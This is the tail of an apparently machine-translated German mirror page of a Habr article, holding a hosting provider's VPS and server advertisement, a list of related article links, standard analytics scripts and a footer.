Vollversion des Kurses finden Sie <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">hier</a> . <br><br>  Vielen Dank für Ihren Aufenthalt bei uns.  Gefällt dir unser Artikel?  Möchten Sie weitere interessante Materialien sehen?  Unterstützen Sie uns, indem Sie eine Bestellung <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">aufgeben</a> oder Ihren Freunden empfehlen, einen <b>Rabatt von 30% für Habr-Benutzer auf ein einzigartiges Analogon von Einstiegsservern, das wir für Sie erfunden haben:</b> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Die ganze Wahrheit über VPS (KVM) E5-2650 v4 (6 Kerne) 10 GB DDR4 240 GB SSD 1 Gbit / s von $ 20 oder wie teilt man den Server?</a>  (Optionen sind mit RAID1 und RAID10, bis zu 24 Kernen und bis zu 40 GB DDR4 verfügbar). <br><br>  <b>VPS (KVM) E5-2650 v4 (6 Kerne) 10 GB DDR4 240 GB SSD 1 Gbit / s bis Dezember kostenlos,</b> wenn Sie für einen Zeitraum von sechs Monaten bezahlen, können Sie <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">hier</a> bestellen. <br><br>  <b>Dell R730xd 2 mal günstiger?</b>  Nur wir haben <b><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">2 x Intel Dodeca-Core Xeon E5-2650v4 128 GB DDR4 6 x 480 GB SSD 1 Gbit / s 100 TV von 249 US-Dollar</a> in den Niederlanden und den USA!</b>  Lesen Sie mehr über <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">den Aufbau eines Infrastrukturgebäudes.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Klasse mit Dell R730xd E5-2650 v4 Servern für 9.000 Euro für einen Cent?</a> </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/de424289/">https://habr.com/ru/post/de424289/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de424275/index.html">Die Energie in der Zelle. Verwendung und Lagerung</a></li>
<li><a href="../de424277/index.html">Auswanderung und alles dazu in Telegramm-Blogs</a></li>
<li><a href="../de424279/index.html">So öffnen Sie eine IP in Deutschland, wenn Sie Programmierer sind und keine Kegel füllen</a></li>
<li><a href="../de424285/index.html">Y Combinator Startup-Tipps: Entwickeln Sie Spielzeugmärkte</a></li>
<li><a href="../de424287/index.html">Wie wir an der InnovateFPGA 2018 teilgenommen haben und nicht wieder gewonnen haben</a></li>
<li><a href="../de424295/index.html">MIT-Kurs "Computer Systems Security". Vorlesung 9: „Sicherheit von Webanwendungen“, Teil 2</a></li>
<li><a href="../de424297/index.html">MIT-Kurs "Computer Systems Security". Vorlesung 9: Sicherheit von Webanwendungen, Teil 3</a></li>
<li><a href="../de424301/index.html">Adaptiver neuronaler Netzwerkbildfilteralgorithmus</a></li>
<li><a href="../de424305/index.html">Plattformübergreifende RIBs für die mobile Architektur von Uber</a></li>
<li><a href="../de424307/index.html">GitLab 11.3 wurde mit Maven-Repository und sicheren Umgebungen veröffentlicht</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>